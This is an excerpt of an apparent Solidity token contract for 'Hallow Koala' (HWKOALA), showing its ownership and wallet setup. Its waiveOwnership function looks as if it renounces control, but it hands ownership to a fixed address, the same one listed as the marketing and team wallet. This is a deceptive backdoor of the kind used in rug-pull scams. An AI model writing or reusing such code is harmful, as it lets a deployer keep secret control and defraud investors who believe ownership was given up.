...
/**
Telegram : https://t.me/HallowKoala
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5Ed6b252ECaA128E565Ca1F515A048E40c7CC0C3);
    }
...
contract HallowKoala is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Hallow Koala";
    string private _symbol = "HWKOALA";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x5Ed6b252ECaA128E565Ca1F515A048E40c7CC0C3);
    address payable private teamWalletAddress = payable(0x5Ed6b252ECaA128E565Ca1F515A048E40c7CC0C3);
